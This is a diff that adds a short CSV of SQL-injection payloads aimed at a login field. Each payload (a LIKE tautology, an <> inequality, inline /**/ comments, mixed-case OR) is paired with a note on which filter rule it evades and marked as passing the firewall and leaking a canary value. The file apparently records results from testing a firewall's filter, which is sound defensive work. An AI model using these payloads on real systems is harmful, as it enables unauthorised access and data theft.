@@ -1,0 +1,5 @@
+bypass_payload,technique,waf_passed,leaks_canary_real_sink,genuine_bypass
+admin' OR 'a' LIKE 'a ,"LIKE tautology: no '=' , no '--'",True,True,True
+admin' OR 'x'<>'y,"'<>' inequality is always true, evades the '=' rules",True,True,True
+admin'/**/OR/**/'a'='a,inline /**/ comment defeats the rule's \bor\b\s+ anchor,True,True,True
+admin'/**/oR/**/'1'='1,mixed case + /**/ comment: classic tautology still slips the rule,True,True,True
